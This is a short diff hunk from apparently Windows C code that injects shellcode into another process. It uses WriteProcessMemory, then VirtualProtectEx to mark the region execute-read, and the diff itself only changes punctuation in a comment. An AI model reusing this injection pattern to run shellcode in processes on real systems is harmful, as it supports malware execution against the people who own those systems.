@@ -910,7 +910,7 @@ WriteProcessMemory(
 	&bytesWritten
 );
 
-// flip to RX — never writable and executable at the same time
+// flip to RX - never writable and executable at the same time
 DWORD oldProtect;
 VirtualProtectEx(pi.hProcess, hMemory, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
 
